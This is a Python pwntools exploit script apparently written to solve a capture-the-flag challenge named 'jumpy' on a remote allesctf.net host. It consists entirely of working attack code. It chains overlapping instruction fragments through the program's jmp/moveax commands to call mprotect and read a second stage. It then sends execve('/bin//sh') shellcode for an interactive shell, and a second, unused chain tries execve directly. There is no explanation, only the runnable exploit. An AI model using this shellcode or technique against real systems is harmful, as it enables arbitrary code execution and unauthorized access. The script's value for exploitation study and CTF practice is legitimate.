#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '7b0000006f7dd1af2f7e4c46-jumpy.challenge.master.allesctf.net', 31337 
binary = './jumpy'
brkpts = '''
b*0x00005555555556c0
c
'''

elf = ELF("jumpy")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port, ssl = True)
    context.noptrace = True

else:
    io = process(binary)
    # io = gdb.debug(binary, brkpts)

execve = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

opcodes = [
"\xeb\x01",
"\xb8\xeb\x03\x90\x90",
"\xb8\x51\x90\xeb\x01", # push rcx
"\xb8\x5f\x90\xeb\x01", # pop rdi
"\xb8\x6a\x7f\xeb\x01", # push 0x7f
"\xb8\x5e\x90\xeb\x01", # pop rsi
"\xb8\x6a\x0a\xeb\x01", # push 0xa
"\xb8\x58\x90\xeb\x01", # pop rax
"\xb8\x6a\x07\xeb\x01", # push 0x7
"\xb8\x5a\x90\xeb\x01", # pop rdx
"\xb8\x0f\x05\xeb\x01", # syscall

"\xb8\x51\x90\xeb\x01", # push rcx
"\xb8\x5e\x90\xeb\x01", # pop rsi
"\xb8\x6a\x00\xeb\x01", # push 0
"\xb8\x5f\x90\xeb\x01", # pop rdi
"\xb8\x6a\x00\xeb\x01", # push 0
"\xb8\x58\x90\xeb\x01", # pop rax
"\xb8\x6a\x7f\xeb\x01", # push 0x7f
"\xb8\x5a\x90\xeb\x01", # pop rdx
"\xb8\x0f\x05\xeb\x01" # syscall
]

if __name__ == "__main__":
    reu("> ")
    for i in opcodes:
        if i[0] == "\xeb":
            sl("jmp")
            sl(str(u8(i[1])))
        else:
            sl("moveax")
            sl(str(u32(i[1:])))
    sl("a")
    sleep(1)
    sl(execve.rjust(0x7f, "\x90"))
    io.interactive()


opcodes1 = [
"\xeb\x06",
"\xb8\x73\x68\x00\x00",
"\xb8\xeb\x03\x90\x90",
"\xb8\x48\x83\xc1\x01", # add rcx, 1
"\xeb\x01",
"\xb8\xeb\x03\x90\x90",
"\xb8\x48\x83\xc1\x01", # add rcx, 1
"\xeb\x01",
"\xb8\xeb\x03\x90\x90",
"\xb8\x48\x83\xc1\x01", # add rcx, 1
"\xeb\x01",
"\xb8\xeb\x03\x90\x90",
"\xb8\x51\x90\xeb\x01", # push rcx
"\xb8\x5f\x90\xeb\x01", # pop rdi
"\xb8\x51\x90\xeb\x01", # push rcx
"\xb8\x54\x90\xeb\x01", # push rsp
"\xb8\x5e\x90\xeb\x01", # pop rsi
"\xb8\x6a\x3b\xeb\x01", # push 0x3b
"\xb8\x58\x90\xeb\x01", # pop rax
"\xb8\x6a\x00\xeb\x01", # push 0
"\xb8\x5a\x90\xeb\x01", # pop rdx
"\xb8\x0f\x05\xeb\x01", # syscall
]